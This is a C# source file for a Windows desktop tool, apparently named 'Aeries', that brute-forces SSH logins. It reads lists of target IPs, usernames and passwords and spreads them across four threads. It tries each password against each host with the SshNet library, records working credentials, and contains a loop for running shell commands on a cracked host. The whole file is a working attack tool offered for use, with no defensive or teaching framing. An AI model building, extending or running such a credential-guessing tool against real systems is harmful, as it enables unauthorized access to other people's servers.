using Microsoft.Win32;
using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace Aeries
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        #region Locals
        public static bool bol1 = false;
        public static string[] senhas = new string[6]; //array used in the past version. Can be replaced by a simple string
        public static string? wordlist;
        public static string? ip, pass, user, word, port;
        public static int porta;
        public static bool bol2 = false;
        public static bool found = false;
        private static bool usingUserList = false;

        //lists for threads
        public static List<string> list1 = new List<string>();
        public static List<string> list2 = new List<string>();
        public static List<string> list3 = new List<string>();
        public static List<string> list4 = new List<string>();
        public static List<string> users = new List<string>();
        public static List<string> passList = new List<string>();
        public static List<string> ipList = new List<string>();
        #endregion


        public MainWindow()
        {
            InitializeComponent();
            rbtn1.IsChecked = true;
        }

        private void RadioButton_Checked(object sender, RoutedEventArgs e)
        {
            ulistBtn.Visibility = Visibility.Hidden;
            uLabel.Content = "Username";
            usingUserList = false;
        }

        private void RadioButton_Checked_1(object sender, RoutedEventArgs e)
        {
            ulistBtn.Visibility = Visibility.Visible;
            uLabel.Content = "User List";
            usingUserList = true;
        }
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog op = new OpenFileDialog();
            op.Filter = ".txt (*.txt)|.txt";
            op.RestoreDirectory = true;
            op.ShowDialog();
            ipTextBox.Text = System.IO.Path.GetFullPath(op.FileName);
            ip = ipTextBox.Text;
        }
        private void passBtn_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog op = new OpenFileDialog();
            op.Filter = ".txt (*.txt)|.txt";
            op.RestoreDirectory = true;
            op.ShowDialog();
            passTextBox.Text = System.IO.Path.GetFullPath(op.FileName);
            word = passTextBox.Text;
            string[] _pass = File.ReadAllLines(word);
            foreach (string _Pass in _pass)
                passList.Add(_Pass);
        }

        private void ulistBtn_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog op = new OpenFileDialog();
            op.Filter = ".txt (*.txt)|.txt";
            op.RestoreDirectory = true;
            op.ShowDialog();
            userTextBox.Text = System.IO.Path.GetFullPath(op.FileName);
            user = userTextBox.Text;
            string[] _users = File.ReadAllLines(userTextBox.Text);
            foreach (string _user in _users)
                users.Add(_user);
        }
        private void StartThreads()
        {
            Thread t = new Thread(() => DefineTarget(list1));
            Thread t2 = new Thread(() => DefineTarget(list2));
            Thread t3 = new Thread(() => DefineTarget(list3));
            Thread t4 = new Thread(() => DefineTarget(list4));
            t.Start();
            Thread.Sleep(500);
            t2.Start();
            Thread.Sleep(500);
            t3.Start();
            Thread.Sleep(500);
            t4.Start();
        }
        public static int count = 0;
        private void DefineTarget(List<string> ips)
        {
            foreach (var ip in ips)
            {
                if (usingUserList)
                {
                    foreach (var user in users)
                        Attack(ip, user);
                }
                else
                    Attack(ip, userTextBox.Text);
            }
        }
        private static int errors = 0;
        private static int successes = 0;
        private static int wrongPass = 0;
        private static int noConnect = 0;

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            StartThreads();
        }

        public void Attack(string ip, string userName)
        {
            string _address = "";
            int _port = 22;
            try
            {
                string[] _ip = ip.Split(':');
                _address = _ip[0];
                _port = int.Parse(_ip[1]);
            }
            catch
            {
                _address = ip;
                _port = 22;
            }
            int ae = -1;
            foreach (var pass in passList) //start brute force
            {
                try
                {
                    if (found)
                        break;
                    else
                    {
                        using (var client = new SshClient(_address, _port, userName, pass))
                        {
                            client.Connect(); //try connect
                            client.Disconnect(); //If you connect successfully, the password is correct
                            ae++;
                            senhas[ae] = $"{_address}|{_port}|{userName}|{pass}"; //save in an array
                            if (!found) //fixing bug
                            {
                                logBox.AppendText("[+] Password found - " + pass + "\nEnter 1 to open a shell\nEnter 2 to exit");
                                Console.WriteLine("[+] Password found - " + pass + "\nEnter 1 to open a shell\nEnter 2 to exit");
                                successes++;
                                sNum.Content = Convert.ToString(successes);
                                found = true;
                                string resp = "";// Console.ReadLine();
                                if (resp == "1")
                                {
                                    Console.WriteLine("Opening shell...");
                                    client.Connect();

                                    while (true)
                                    {
                                        try
                                        {
                                            if (!bol2)
                                                Console.WriteLine("Shell opened. Type 'exit' to exit.");
                                            else
                                                Console.Write("$ ");
                                            bol2 = true;
                                            var comand = Console.ReadLine();
                                            var output = client.RunCommand(comand); //run the command on shell
                                            if (comand.ToString() == "exit")
                                                break;
                                            else
                                                Console.WriteLine(output.Result);
                                        }
                                        catch (Exception ex)
                                        {
                                            if (!ex.ToString().Contains("CommandText property is empty"))
                                                Console.WriteLine("Error!");
                                        }
                                    }
                                    client.Disconnect();
                                    end();
                                }
                                else { }//case 2 or another
                                   // end();
                            }
                            else
                                break;


                        }
                    }
                }
                catch (Exception ex)
                {
                    errors++;
                    errNum.Content = errors.ToString();
                    if (!found) //fixing bug
                    {
                        if (ex.ToString().Contains("Permission denied"))
                        {
                            logBox.AppendText("[+] Wrong password --> " + pass);
                            Console.WriteLine("[+] Wrong password --> " + pass);
                            wrongPass++;
                            wpCount.Content = wrongPass.ToString();
                        }
                        else if (ex.ToString().Contains("10051"))
                        {
                            logBox.AppendText("Could not connect to the target.");
                            Console.WriteLine("Could not connect to the target.");
                            bol1 = true;
                            noConnect++;
                            cncCount.Content = noConnect.ToString();
                            break;
                        }
                        else
                        {
                            logBox.AppendText("Unknown error: " + ex.ToString());
                            Console.WriteLine("Unknown error: " + ex.ToString());
                            bol1 = true;
                            break;
                        }
                    }
                }

            }
            count--;
            if (count == 0)
            {
                end();
            }
        }
        public static int kpi = 0;
        public void end()
        {
            kpi++;
            if (kpi != 1)
            {
                Console.WriteLine("\nEnd of the attack.");
                if (!bol1)
                {
                    Console.WriteLine("Password found for user " + user + ":");
                    bool found = false;
                    foreach (var item in senhas)
                    {
                        if (item != null)
                        {
                            logBox.AppendText("[*] " + item);
                            Console.WriteLine("[+] " + item);
                            found = true;
                        }
                        if (!found)
                        {
                            logBox.AppendText("No valid combinations were found.");
                            Console.WriteLine("No password was found.");
                            break;
                        }
                    }
                }
            }
        }
        #region List Sorting
        public static void threads()
        {
            StreamReader str;
            try
            {
                str = new StreamReader(ip);
                string word = "";
                int cont = 0;
                while ((word = str.ReadLine()) != null)
                {
                    cont++;
                    if (cont == 1)
                        list1.Add(word);
                    else if (cont == 2)
                        list2.Add(word);
                    else if (cont == 3)
                        list3.Add(word);
                    else if (cont == 4)
                        list4.Add(word);
                    else
                    {
                        cont = 1;
                        list1.Add(word);
                    }
                }
            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Wordlist was not found."); //there is not a text file called "wordlist" in the directory
                Console.ForegroundColor = ConsoleColor.White;
                Environment.Exit(0);
            }
            count = list1.Count + list2.Count + list3.Count + list4.Count;
        }
        #endregion 
    }
}
